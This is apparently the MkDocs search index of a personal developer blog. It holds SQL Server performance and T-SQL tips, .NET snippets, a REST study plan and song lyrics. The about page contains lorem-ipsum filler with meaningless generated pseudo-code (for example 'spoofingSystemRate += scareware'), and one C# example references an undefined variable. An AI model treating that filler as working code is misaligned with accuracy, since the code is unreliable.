{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs For full documentation visit mkdocs.org . Commands mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Welcome to MkDocs"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"about/","text":"Valens mori urbem ignibus virtus qui mediis Ut det Claros agitante horrida Iuppiter et Lorem markdownum ranae, medicamine et opposuit iam, sed abit telluris. Manu aut fallax huic, quod sum virides, ille in inque at, equos. Intercipit iuvenis et dum illic , coniunx ingentique tamen, Phaestiadas strenua effugiam quem nomine tum optima fortunata veterum? Dira sat agilis locum? Per mihi aequales solacia percussamque caede. Illa posse setae exstant cruentas cervi candore limite qui finge catulus religatam ante. Philyreia est et inpressa , in tulerunt uni urbem saxo Carthaea pharetram Illa, haud desint tempusque celat. Ore haec, mora iam, solos edere stellas Iovis, atra. Nymphas pelagi in anguis et qua Alcmena. Illa pinum: fugit qui tanto stamina lacrimoso et metam mensis quibus hac atros missus. Ethemon anguem terribili Melanthus Bellona est; non longe visi caruissem! Populante sumpta et manus solverat exhalat vulnera erubuere, iamque cursu quoque. Galeaque iungimus carminibus sic et nisi traho Tendit medius, non avidae, dedignata inscius: per more idem insistere. Ut oblitus et optatis factisque maior: poenae et cupidine fallis ex, ut. spoofingSystemRate += scareware; mms.multitaskingNewbieNetwork.mtu_soap(sip_markup(pcb_lock_simplex, mnemonic, ocr), ioIcfShift - networking_pram); if (3 - ieee) { lock(cdma, lag_page); } else { screenshot += fat_snow; fsbPseudocode(snowLed * import, screenshot); } webWindowsBoot(outputDimm, cpc.vpn_crossplatform_mountain(5, -2), restore( -1, 3 - 458530, syntax)); if (artificial != media_switch) { dawTagPlay = search_listserv; desktop.downPagePum(qbe_requirements_xp * webcamWeb, linuxCmyk.jpeg_lte.gatewayUtilitySkyscraper(-4), data( ipadBootFtp, queue)); } Si fateor et excutit gelido, sua cum admonitus quo causa milibus: leto illis, medio confinia insequar. Nullus isque rogantem respondere natum paternos posset properare nostras et fidelius Deucalioneas hos Rhodope. Instantem flumen sic fecit factum vapor videtur gentibus solent sidera premeret aptae deserit , hac. Ab rates illi si loquax gemitu precatur; ope vult. Modo hanc nec hunc ne cervix damnare. Dux primis aequora os Caicum votis, usus simulatoremque Hiberis . In agantur!","title":"Valens mori urbem ignibus virtus qui mediis"},{"location":"about/#valens-mori-urbem-ignibus-virtus-qui-mediis","text":"","title":"Valens mori urbem ignibus virtus qui mediis"},{"location":"about/#ut-det-claros-agitante-horrida-iuppiter-et","text":"Lorem markdownum ranae, medicamine et opposuit iam, sed abit telluris. Manu aut fallax huic, quod sum virides, ille in inque at, equos. Intercipit iuvenis et dum illic , coniunx ingentique tamen, Phaestiadas strenua effugiam quem nomine tum optima fortunata veterum? Dira sat agilis locum? Per mihi aequales solacia percussamque caede. Illa posse setae exstant cruentas cervi candore limite qui finge catulus religatam ante. Philyreia est et inpressa , in tulerunt uni urbem saxo Carthaea pharetram Illa, haud desint tempusque celat. Ore haec, mora iam, solos edere stellas Iovis, atra. Nymphas pelagi in anguis et qua Alcmena. Illa pinum: fugit qui tanto stamina lacrimoso et metam mensis quibus hac atros missus. Ethemon anguem terribili Melanthus Bellona est; non longe visi caruissem! Populante sumpta et manus solverat exhalat vulnera erubuere, iamque cursu quoque.","title":"Ut det Claros agitante horrida Iuppiter et"},{"location":"about/#galeaque-iungimus-carminibus-sic-et-nisi-traho","text":"Tendit medius, non avidae, dedignata inscius: per more idem insistere. Ut oblitus et optatis factisque maior: poenae et cupidine fallis ex, ut. spoofingSystemRate += scareware; mms.multitaskingNewbieNetwork.mtu_soap(sip_markup(pcb_lock_simplex, mnemonic, ocr), ioIcfShift - networking_pram); if (3 - ieee) { lock(cdma, lag_page); } else { screenshot += fat_snow; fsbPseudocode(snowLed * import, screenshot); } webWindowsBoot(outputDimm, cpc.vpn_crossplatform_mountain(5, -2), restore( -1, 3 - 458530, syntax)); if (artificial != media_switch) { dawTagPlay = search_listserv; desktop.downPagePum(qbe_requirements_xp * webcamWeb, linuxCmyk.jpeg_lte.gatewayUtilitySkyscraper(-4), data( ipadBootFtp, queue)); } Si fateor et excutit gelido, sua cum admonitus quo causa milibus: leto illis, medio confinia insequar. Nullus isque rogantem respondere natum paternos posset properare nostras et fidelius Deucalioneas hos Rhodope. Instantem flumen sic fecit factum vapor videtur gentibus solent sidera premeret aptae deserit , hac. Ab rates illi si loquax gemitu precatur; ope vult. Modo hanc nec hunc ne cervix damnare. Dux primis aequora os Caicum votis, usus simulatoremque Hiberis . In agantur!","title":"Galeaque iungimus carminibus sic et nisi traho"},{"location":"index%20copy/","text":"Welcome to MkDocs For full documentation visit mkdocs.org . Commands mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Welcome to MkDocs"},{"location":"index%20copy/#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"index%20copy/#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"index%20copy/#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"2006/09/2006-09-26-simple-way-to-speed-up-the-query/","text":"We recently had an issue with a stored procedure that was doing a join on multiple tables. It was running extremely slow. Here's an example of what it did. Tables: tblOne (TestId, SomeText) tblTwo (TestId, OtherText) SELECT: DECLARE @TestId select @TestId = 1 select a.TestId, b.OtherTxt from tblOne a, tblTwo b where a.TestId = @TestId and a.TestId = b.TestId Running the stored procedure like this passing in a TestId will work but it will also not filter the rows it selects on tblTwo just because of the join statement (a.TestId = b.TestId). You have to add \"and b.TestId = @TestId\". This will limit the number of rows scanned in tblTwo and speed up your stored procedure.","title":"Simple way to speed up the query"},{"location":"2006/10/2006-10-01-good-blog/","text":"http://weblogs.sqlteam.com/","title":"Good blog"},{"location":"2006/10/2006-10-17-searching-object-across-the-databases/","text":"SET QUOTED_IDENTIFIER ON GO sp_msforeachdb \"use ? ; SELECT name AS Table_Name,xtype AS type,'?' AS DB_Name FROM sysobjects WHERE name LIKE 'object_name%'\"","title":"searching object across the databases."},{"location":"2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/","text":"1) Time DECLARE @start datetime, @stop datetime SET @start = GETDATE() WAITFOR DELAY '00:00:00.080' -- Write your query here instad of waitfor SET @stop = GETDATE() SELECT 'The execution took ' + CONVERT(varchar(10), DATEDIFF(ms, @start, @stop)) + ' ms to finish' 2.STATISTICS TIME USE Northwind GO SET STATISTICS TIME ON SELECT * FROM orders (830 row(s) affected) SQL Server Execution Times: CPU time = 30 ms, elapsed time = 500 ms. The CPU time is most important.If it is decreasing when you are querying the table,better it is. If this is increasing while you are querying the table,you are messing up. 3. STATISTICS IO USE Northwind GO SET STATISTICS IO ON SELECT * FROM orders Table 'Orders'. Scan count 1, logical reads 22, physical reads 0, read-ahead reads 0. Of these,scan count is the number of times the table is being accessed fro retrieving the data. This is important when you are joining the tables. The next parts tells us how many pages (data and/or index) that were read from the cache in memory to fetch the results, how many pages that were read from disk and the final number called read-ahead reads shows how many pages were placed into the cache for the query.The logical read is most important.If it is decreasing when you are querying the table,better it is.If this is increasing while you are querying the table,you are messing up. Detailed overview One thing that often amazes me is that many SQL Server developers do not actually measure the performance of their queries. When you are working with a small site or home project you might not see a big difference, but when implementing systems with large amounts of users and high levels of traffic you can not just settle with the fact that your query returns the expected result. You must also make sure that your queries use the least amount of resources and execute as quickly as possible. Sure, you can read articles and literature that describe how to write queries that perform well, but you can still not be sure that they work in an optimal way for your specific situation. After all, different schema designs, amounts of data, hardware resources etc all affect how a query performs. And one of the problems with SQL is that you can write the same query (i.e. that return the same results) in many different ways, and the performance of these different formulations will often differ as well. When I started investigating why some developers did not compare the performance of their queries it became clear to me that the main reason is that they do not know how to do this in an easy way. Many of them thought that you needed external tools, more or less complicated, to run against your server, and they did not have the time or inclination to learn and try these. This article will describe a couple of much easier methods of measuring performance of queries. Time The most simple way to measure performance is of course to measure the time it takes to execute a query. If you have not already noticed it, take a look in the status bar at the bottom-right corner of Query Analyzer. There you will find a timer that shows how many hours:minutes:seconds it took for a query (or rather the entire script) to execute. This is of course not a very exact measurement. Most queries you want to measure will probably not take more than a second to run, in a high-traffic environment they should probably execute in milliseconds if they are correctly optimized. So you need a better instrument to measure the execution time for a query. Another, and better way to measure the amount of time it takes for a query to execute is to use the built-in function GETDATE(). Example 1 show how you can do this. The example uses the command WAITFOR to make the query execution 'stand still' for as long as we specify with DELAY. By first storing the present date and time when the execution begins and then comparing this to what it is when the execution is finished we can get a more exact measurement with milliseconds specified. Note however that the time is only specified down to 1/300 of a second (i.e. 3.33 ms). So, if a query takes 40 ms to execute that means somewhere between 40-43 ms. -- Example 1 DECLARE @start datetime, @stop datetime SET @start = GETDATE() WAITFOR DELAY '00:00:00.080' -- do not do anything for 80 ms SET @stop = GETDATE() SELECT 'The execution took ' + CONVERT(varchar(10), DATEDIFF(ms, @start, @stop)) + ' ms to finish' STATISTICS TIME The best way to measure time however is to use the configuration setting SET STATISTICS TIME. The syntax for this is as shown below: SET STATISTICS TIME {ON | OFF} When this parameter is set to on the results pane of Query Analyzer will show statistics for the time it took to execute a query. Note that if you are running QA in grid mode you will need to switch to the Messages tab to see this. Example 2 demonstrates this: -- Example 2 USE Northwind GO SET STATISTICS TIME ON SELECT * FROM orders In my results pane I get the following text: SQL Server Execution Times: CPU time = 0 ms, elapsed time = 0 ms. SQL Server parse and compile time: CPU time = 0 ms, elapsed time = 0 ms. (830 row(s) affected) SQL Server Execution Times: CPU time = 30 ms, elapsed time = 500 ms. At first glance this might seem complicated to understand, but more or less the only thing you need to do is to look for the row with SQL Server Execution Times that is printed right after the text that specifies the number of affected rows. Above this you can see the time it took to parse and compile the query, but that time is not what we are interested in here. Most of the times this will be 0 ms if you run the same query several times in a row since the execution plan will already be cached. As said earlier, what we are looking for is the time it took to execute the query. In the example above it needed 30 ms of CPU time, but the total amount of time needed was 500 ms (try replacing the WAITFOR statement in example 1 with the select statement in example 2 and see if GETDATE gives you the same measurement). But if CPU time was only 30 ms, then where are the remaining 470 ms? The answer for this is I/O. STATISTICS IO As you probably know I/O is short for Input/Output. You could say that it means reading/writing resources, and normally you mean reading/writing from/to disk or memory. Very simply described, SQL Server needs to have the data pages containing the data to return to the client stored in memory (RAM). If they are not already cached there they must first be read from disk where they are physically stored and then placed in memory, from where they can then be returned to the client. The data pages will then be cached in memory for an unspecified time, which depending on several factors can range from 0 - ~ (indefinitely). Therefore a query might need more time to execute the first time you execute it, and because of this you should always execute the query a couple of times when measuring performance for it. It is not only the time it takes for a query to execute that is interesting when measuring performance. Equally important (and often even more) is the amount of system resources that is needed to execute it. Since I/O is normally the slowest part of a query, especially if physical disk access is needed, it is very important to know the amount of I/O resources needed to execute it. The way to measure this is to use another configuration setting called SET STATISTICS IO. The syntax for this is similar to that of SET STATISTICS TIME: SET STATISTICS IO {ON | OFF} The result however is different. Again, look in the text of the results pane in QA. I executed example 2 a couple of times and the result is shown below: Table 'Orders'. Scan count 1, logical reads 22, physical reads 0, read-ahead reads 0. First we have the table name. Then comes the number of time this table was scanned, or rather accessed, to fetch the result of the query. The next parts tells us how many pages (data and/or index) that were read from the cache in memory to fetch the results, how many pages that were read from disk and the final number called read-ahead reads shows how many pages were placed into the cache for the query. The numbers you should normally look at is logical and physical reads plus scan count, and they should all of course be as low as possible. It might be better to have 100 logical reads than 10 physical reads since it is faster to read from memory, but generally speaking they should both be as low as possible. If you execute a query a couple of times physical reads will often be 0 since the data pages will already be cached after the first execution. Use these numbers to compare the resources needed when executing the same query formulated in different ways. Other tools With the above mentioned tools you have a good way of deciding which of several different versions of a query you should use to get the results you want in an optimal way. There are lots of other tools available as well, but I will not discuss them in this article. If you want to experiment with them yourself I would recommend you take a look at the following tools: Show execution plan: by pressing Ctrl-K you get an extra tab when executing queries in QA. This tab shows a graphical representation of the execution plan used by SQL Server to execute your query. There is lots of information in Books Online about how to use the information shown there, as well as articles online. SET STATISTICS PROFILE: This configuration option gives you a textbased variant of the execution plan. SET SHOWPLAN_ALL and SET SHOWPLAN_TEXT: These options both present information regarding the resources and execution plan that would be used to execute the query, without actually executing it. Profiler, Sysmon (Performance Monitor) and other external applications: Finally there are several external applications that can be used to measure and show different events and measurements in SQL Server and the system under execution. Profiler, a tool in the SQL Server client tools pack, connects to SQL Server and log all kind of diffenent events that occur, and Sysmon can of course be used to log measurements for a huge amount of performance counters both for SQL Server and the system as a whole.","title":"Knowing how much time your query is taking!!"},{"location":"2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/#time","text":"The most simple way to measure performance is of course to measure the time it takes to execute a query. If you have not already noticed it, take a look in the status bar at the bottom-right corner of Query Analyzer. There you will find a timer that shows how many hours:minutes:seconds it took for a query (or rather the entire script) to execute. This is of course not a very exact measurement. Most queries you want to measure will probably not take more than a second to run, in a high-traffic environment they should probably execute in milliseconds if they are correctly optimized. So you need a better instrument to measure the execution time for a query. Another, and better way to measure the amount of time it takes for a query to execute is to use the built-in function GETDATE(). Example 1 show how you can do this. The example uses the command WAITFOR to make the query execution 'stand still' for as long as we specify with DELAY. By first storing the present date and time when the execution begins and then comparing this to what it is when the execution is finished we can get a more exact measurement with milliseconds specified. Note however that the time is only specified down to 1/300 of a second (i.e. 3.33 ms). So, if a query takes 40 ms to execute that means somewhere between 40-43 ms. -- Example 1 DECLARE @start datetime, @stop datetime SET @start = GETDATE() WAITFOR DELAY '00:00:00.080' -- do not do anything for 80 ms SET @stop = GETDATE() SELECT 'The execution took ' + CONVERT(varchar(10), DATEDIFF(ms, @start, @stop)) + ' ms to finish'","title":"Time"},{"location":"2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/#statistics-time","text":"The best way to measure time however is to use the configuration setting SET STATISTICS TIME. The syntax for this is as shown below: SET STATISTICS TIME {ON | OFF} When this parameter is set to on the results pane of Query Analyzer will show statistics for the time it took to execute a query. Note that if you are running QA in grid mode you will need to switch to the Messages tab to see this. Example 2 demonstrates this: -- Example 2 USE Northwind GO SET STATISTICS TIME ON SELECT * FROM orders In my results pane I get the following text: SQL Server Execution Times: CPU time = 0 ms, elapsed time = 0 ms. SQL Server parse and compile time: CPU time = 0 ms, elapsed time = 0 ms. (830 row(s) affected) SQL Server Execution Times: CPU time = 30 ms, elapsed time = 500 ms. At first glance this might seem complicated to understand, but more or less the only thing you need to do is to look for the row with SQL Server Execution Times that is printed right after the text that specifies the number of affected rows. Above this you can see the time it took to parse and compile the query, but that time is not what we are interested in here. Most of the times this will be 0 ms if you run the same query several times in a row since the execution plan will already be cached. As said earlier, what we are looking for is the time it took to execute the query. In the example above it needed 30 ms of CPU time, but the total amount of time needed was 500 ms (try replacing the WAITFOR statement in example 1 with the select statement in example 2 and see if GETDATE gives you the same measurement). But if CPU time was only 30 ms, then where are the remaining 470 ms? The answer for this is I/O.","title":"STATISTICS TIME"},{"location":"2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/#statistics-io","text":"As you probably know I/O is short for Input/Output. You could say that it means reading/writing resources, and normally you mean reading/writing from/to disk or memory. Very simply described, SQL Server needs to have the data pages containing the data to return to the client stored in memory (RAM). If they are not already cached there they must first be read from disk where they are physically stored and then placed in memory, from where they can then be returned to the client. The data pages will then be cached in memory for an unspecified time, which depending on several factors can range from 0 - ~ (indefinitely). Therefore a query might need more time to execute the first time you execute it, and because of this you should always execute the query a couple of times when measuring performance for it. It is not only the time it takes for a query to execute that is interesting when measuring performance. Equally important (and often even more) is the amount of system resources that is needed to execute it. Since I/O is normally the slowest part of a query, especially if physical disk access is needed, it is very important to know the amount of I/O resources needed to execute it. The way to measure this is to use another configuration setting called SET STATISTICS IO. The syntax for this is similar to that of SET STATISTICS TIME: SET STATISTICS IO {ON | OFF} The result however is different. Again, look in the text of the results pane in QA. I executed example 2 a couple of times and the result is shown below: Table 'Orders'. Scan count 1, logical reads 22, physical reads 0, read-ahead reads 0. First we have the table name. Then comes the number of time this table was scanned, or rather accessed, to fetch the result of the query. The next parts tells us how many pages (data and/or index) that were read from the cache in memory to fetch the results, how many pages that were read from disk and the final number called read-ahead reads shows how many pages were placed into the cache for the query. The numbers you should normally look at is logical and physical reads plus scan count, and they should all of course be as low as possible. It might be better to have 100 logical reads than 10 physical reads since it is faster to read from memory, but generally speaking they should both be as low as possible. If you execute a query a couple of times physical reads will often be 0 since the data pages will already be cached after the first execution. Use these numbers to compare the resources needed when executing the same query formulated in different ways.","title":"STATISTICS IO"},{"location":"2006/11/2006-11-27-knowing-how-much-time-your-query-is-taking/#other-tools","text":"With the above mentioned tools you have a good way of deciding which of several different versions of a query you should use to get the results you want in an optimal way. There are lots of other tools available as well, but I will not discuss them in this article. If you want to experiment with them yourself I would recommend you take a look at the following tools: Show execution plan: by pressing Ctrl-K you get an extra tab when executing queries in QA. This tab shows a graphical representation of the execution plan used by SQL Server to execute your query. There is lots of information in Books Online about how to use the information shown there, as well as articles online. SET STATISTICS PROFILE: This configuration option gives you a textbased variant of the execution plan. SET SHOWPLAN_ALL and SET SHOWPLAN_TEXT: These options both present information regarding the resources and execution plan that would be used to execute the query, without actually executing it. Profiler, Sysmon (Performance Monitor) and other external applications: Finally there are several external applications that can be used to measure and show different events and measurements in SQL Server and the system under execution. Profiler, a tool in the SQL Server client tools pack, connects to SQL Server and log all kind of diffenent events that occur, and Sysmon can of course be used to log measurements for a huge amount of performance counters both for SQL Server and the system as a whole.","title":"Other tools"},{"location":"2006/11/2006-11-27-sql-server-table-variables-to-eliminate-the-need-for-cursors/","text":"USE NORTHWIND -- we declare our table variable first declare @SpecialCustomers TABLE ( CustomerID nchar (5) NOT NULL , OrderID int NOT NULL , ShipVia int NOT NULL, Freight money NOT NULL) -- now we populate the in-memory table variable with the record information needed for the update insert into @SPecialCustomers select CustomerID, OrderID, ShipVia, Freight from dbo.Orders where ShipVia =1 AND Freight >50.25 -- and finally we update the affected records in our regular orders table with our new shipper and price information, -- using the @SpecialCustomers TABLE variable just as we would a real, physical table in the database: UPDATE ORDERS SET ShipVia=4, Freight =21.00 where ORDERS.OrderID IN (SELECT ORDERID FROM @SpecialCustomers)","title":"SQL Server Table Variables To Eliminate The Need For Cursors"},{"location":"2006/11/2006-11-29-searching-with-different-criteria-in-sql-server-2000/","text":"From the code calling the SP,set the parameter(s) to null if there is no value. Have SP parameters set to null and then use COALESCE for the parameters with the \"where\" clause between the criteria as given below. CREATE PROCEDURE SearchCustomers @Cus_Name varchar(30) = NULL, @Cus_City varchar(30) = NULL, @Cus_Country varchar(30) =NULL AS SELECT Cus_Name, Cus_City, Cus_Country FROM Customers WHERE Cus_Name = COALESCE(@Cus_Name,Cus_Name) AND Cus_City = COALESCE(@Cus_City,Cus_City) AND Cus_Country = COALESCE(@Cus_Country,Cus_Country)","title":"Searching with different criteria in SQL server 2000"},{"location":"2006/12/2006-12-16-can-not-drop-user-from-database/","text":"Problem :- I can not delete user from a database in sql2005 beta 3. the message errror is : TITLE: SQL Server Management Studio ---------------------------------------- Drop failed for User 'Amministratore'. (Microsoft.SqlServer.Smo) For help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft SQL Server&ProdVer=9.00.0981.00&EvtSrc=Microsoft.SqlServer.Management.Smo.ExceptionTemplates.FailedOperationExceptionText&EvtID=Drop+User&LinkId=20476 ---------------------------------------- ADDITIONAL INFORMATION: An exception occurred while executing a Transact-SQL statement or batch. (Microsoft.SqlServer.ConnectionInfo) ---------------------------------------- The database principal owns a schema and cannot be dropped. (Microsoft SQL Server, Error: 15138) Solution:- 1) Expand Schemas(should be like a folder under -> Security) . 2) Script the the unwanted \"userSchema\" save it and and then Delete the schema. 3) Then, go back to the User,script the user and then delete the user. 4) Associate the schema back to the user by running the script.","title":"can not drop user from database"},{"location":"2007/03/2007-03-05-checking-for-the-existence-of-a-temporary-table/","text":"[sourcecode language=\"csharp\" padlinenumbers=\"true\"] IF object_id('tempdb..#MyTempTable') IS NOT NULL BEGIN DROP TABLE #MyTempTable PRINT 'Table dropped' END CREATE TABLE #MyTempTable ( ID int IDENTITY(1,1), SomeValue varchar(100) ) GO [/sourcecode]","title":"Checking for the existence of a temporary table"},{"location":"2007/03/2007-03-05-returning-value-from-sp_executesql/","text":"USE Northwind DECLARE @Count int execute sp_executesql N'select @Count = COUNT(*) from Northwind.dbo.Orders', N'@Count int OUT', @Count OUT SELECT @Count","title":"Returning value from sp_executesql"},{"location":"2008/05/2008-05-26-convert-string-to-byte-array-and-viceversa/","text":"byte[] elementByteContent= contentObject.Content; // this byte array content string elementStringContent = System.Text.Encoding.UTF8.GetString(elementByteContent); elementStringContent = elementStringContent.Replace(\" \", \"\"); if (elementStringContent == string.Empty) { elementStringContent = \" \"; contentObject.Content = System.Text.Encoding.UTF8.GetBytes(elementStringContent); }","title":"Convert  string to byte array and viceversa"},{"location":"2008/05/2008-05-26-process-start-open-the-file-from-the-application-after-writing-on-the-file/","text":"There are instances where you write to a file (say XML/Text file/word) fo debugging/testing etc.In those scenarios,your program finishes writing to the file and then you open the file manually in the application(IE/Notepad/Microsoft word) to see what the program has written in that file.You can actually launch that application after you finish writing to that file from with in the program making the whole process quick.The file opens in its default application right after you finish debugging without you needing to manually open it. The steps:- (2 lines):- a) Include the namespace:- using System.Diagnostics; b) Start the process for the saved file:- // //Code to save the file // // Following line would open the saved file in its default application Process.Start(\"SavedFullFilePath\"); Example:- // Code to save the file XmlDocument Xdoc = new XmlDocument(); string folderPath = @\"C:\\Ashish\\\"; string upload = folderPath + \"2007.docx\"; string savename = folderPath + \"WordPackage.xml\"; ZipPackage zipPackage = null; byte[] packageData = null; Stream stream; packageData = GetBytesFromFile(upload); stream = new MemoryStream(packageData); if (stream != null) zipPackage = GetZipPackageFromStream(stream); Xdoc = RRD.DSA.SCP.OfficeAssembler.WordToXyXmlAssembler.ConvertToXyXml(zipPackage); Xdoc.Save(savename); // Following line would open the saved file in its default application (Internet explorer) Process.Start(strSave);","title":"Process.Start() - Open the file from the application after writing on the file"},{"location":"2008/05/2008-05-26-removing-comments-using-xpathnavigator-selectdescendantssystem-xml-xpath-xpathnodetype-commentfalse/","text":"region Remove XML commentsSystem.Xml.XPath.XPathNavigator path = xmlDoc.SelectSingleNode(\"w:document\",xmlNSMgr).CreateNavigator(); System.Xml.XPath.XPathNodeIterator commentsIterator = path.SelectDescendants(System.Xml.XPath.XPathNodeType.Comment,false); if (commentsIterator.Count > 0) {while (commentsIterator.MoveNext()) {commentsIterator.Current.DeleteSelf();}}#endregion For the following XML:-(We needed to remove \" \") - http://schemas.openxmlformats.org/markup-compatibility/2006 \" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\" http://schemas.openxmlformats.org/officeDocument/2006/relationships \" xmlns:m=\" http://schemas.openxmlformats.org/officeDocument/2006/math \" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp=\" http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing \" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\" http://schemas.openxmlformats.org/wordprocessingml/2006/main \" xmlns:wne=\" http://schemas.microsoft.com/office/word/2006/wordml \"> - - - - - Evaluation Only. Created with Aspose.Words. Copyright 2003-2007 Aspose Pty Ltd.","title":"Removing comments using XPathNavigator.SelectDescendants(System.Xml.XPath.XPathNodeType.Comment,false);"},{"location":"2008/05/2008-05-26-removing-comments-using-xpathnavigator-selectdescendantssystem-xml-xpath-xpathnodetype-commentfalse/#region-remove-xml-commentssystemxmlxpathxpathnavigator-path-xmldocselectsinglenodewdocumentxmlnsmgrcreatenavigator","text":"System.Xml.XPath.XPathNodeIterator commentsIterator = path.SelectDescendants(System.Xml.XPath.XPathNodeType.Comment,false); if (commentsIterator.Count > 0) {while (commentsIterator.MoveNext()) {commentsIterator.Current.DeleteSelf();}}#endregion For the following XML:-(We needed to remove \" \") - http://schemas.openxmlformats.org/markup-compatibility/2006 \" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\" http://schemas.openxmlformats.org/officeDocument/2006/relationships \" xmlns:m=\" http://schemas.openxmlformats.org/officeDocument/2006/math \" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp=\" http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing \" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\" http://schemas.openxmlformats.org/wordprocessingml/2006/main \" xmlns:wne=\" http://schemas.microsoft.com/office/word/2006/wordml \"> - - - - - Evaluation Only. Created with Aspose.Words. Copyright 2003-2007 Aspose Pty Ltd.","title":"region Remove XML commentsSystem.Xml.XPath.XPathNavigator path = xmlDoc.SelectSingleNode(\"w:document\",xmlNSMgr).CreateNavigator();"},{"location":"2008/06/2008-06-02-visual-studio-2005-build-error-the-volume-for-a-file-has-been-externally-altered-so-that-the-opened-file-is-no-longer-valid/","text":"Just clean the solution and rebuild. Just dont have any idea why the above error happened this morning when I tried to add some code to a windows service and tried to build the solution.But it has a simple resolution,just clean the solution. :-) [Solution Explorer > Right click on the Solution> Select \"Clean Solution\"].","title":"Visual studio 2005 Build error :- The volume for a file has been externally altered so that the opened file is no longer valid"},{"location":"2008/07/2008-07-23-gios-pdf-net-library/","text":"Very sleek open source PDF creation library built in .NET and its up for commercial use. http://www.codeproject.com/KB/graphics/giospdfnetlibrary.aspx","title":"Gios PDF .NET library"},{"location":"2008/07/2008-07-23-use-sections-in-the-config-file-and-access-them/","text":"(NameValueCollection)ConfigurationManager.GetSection(\"applicationSettings/ConnectionStrings\"); for the following XML fragment in the config file:-","title":"Use sections in the config file and access them..."},{"location":"2008/08/2008-08-08-nice-add-ins-for-reflector/","text":"Nice add-ins for Reflector:- http://www.codeplex.com/reflectoraddins (if you dont have reflector,download the same from http://www.aisto.com/roeder/dotnet ). One of the very useful add-in is the \"diff\" add-in. Which would point out the differences between the two versions of the same assemblies including any added/changed/deleted members/methods. And also the \"File Diassembler\" where all you have to do is provide the assembly (with the dependent assemblies) you want to disassemble and it would generate the class library out of the same with all the source code. Others are code search,Code Metrics and many more. In order to use an add-in in the Reflector :- a) Copy the all the binaries for the add-in in the same directory as the Reflector.exe. b) In the reflector,View > Add-In. In the Add-ins dialog,Add the dll for the Add-in. c) You should see the added \"Add-In\" under Tools menu.","title":"Nice add-ins for Reflector"},{"location":"2008/11/2008-11-28-gazal-by-jagjit-singh-hai-lau-zindagi/","text":"[youtube=http://www.youtube.com/watch?v=-8Cn3Yg8UwU] This is one of the numerous beautiful gazals from Jagjit Singh. I first heard this in a documentary named \"Hello Zindagi\" on Doordarshan hosted by Nalini Singh. I loved this song and after some searching I got this. Lyrics:- hai lau zindagi...zindagi noor hai magar isme jalne ka dastoor hai adhoore se rishton me jalte raho adhoori si sasson me pal te raho... magar jiye jaane ka dastoor hai - 2 Hai lau zindagi.. rawayat hai ke zindagi gahana hai ya heera hai aur chatate rahana hai Ke lamhon main marne kaa dastoor hai-2 Hai lau zindagi.. Thanks, Ashish","title":"Gazal by Jagjit Singh - Hai Lau Zindagi"},{"location":"2009/01/2009-01-26-asp-net-performace-tricks/","text":"Performance Issues in ADO.NET DataTable Usage - Use Enum to Access Items in DataRow http://www.knowdotnet.com/articles/adoenums.html","title":"ASP.NET performace tricks"},{"location":"2009/01/2009-01-28-quickly-open-a-file-in-vs2005vs2008/","text":"Just in case you know the name of a file and want to open the among many without finding in the solution explorer,check out the following option in the VS.NET. Just type \"> open\" followed by first few characters of the file in the \"Find\" in the toolbar and it would give you all the matching results(irrespective of the location or extensiton). You just hit enter on the file you want to open. Update :- And how to go to that Find bar in the VS 2008. Just hit Ctrl+/ and you are there! :-)Just hit Ctrl+/ and you are there! :-)","title":"Quickly open a file in VS2005/VS2008"},{"location":"2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/","text":"1) What is REST? a)Definition b)Tenets of REST ful services c)High REST and Low REST ful service (\u201c 302- Object moved\u201d :-) - to the last point I need a lot to learn before I get back to this) d)Ways to develop REST ful services. Question :- Are you comfortable confident in in REST for what you have read till now? 2) REST ful services using WCF a) How to map REST verbs with HTTP verbs b) Reading HTTP specification for the GET,POST,PUT and DELETE Question :- Are you comfortable confident in in REST for what you have read till now? c) How to create a REST ful service? i) Get comfortable with the different templates of the REST starter kit. i) Making use of GET,POST,PUT and DELETE ii) When to use POST,PUT and DELETE Get the examples. Question :- Are you comfortable confident in in REST for what you have read till now? d) How to consume a REST ful service? Create examples which do the following:- i) Use Yahoo search ii) Use Google search iii) Use Twitter e) Caching with REST f) Database operations with REST Question :- Are you comfortable confident in in REST for what you have read till now? 1) c)High REST and Low REST ful service Reading material :- a) http://www.mnot.net/blog/2006/03/20/hi_lo b) http://lesscode.org/2006/03/19/high-low-rest/ I started here at 12:33 PM 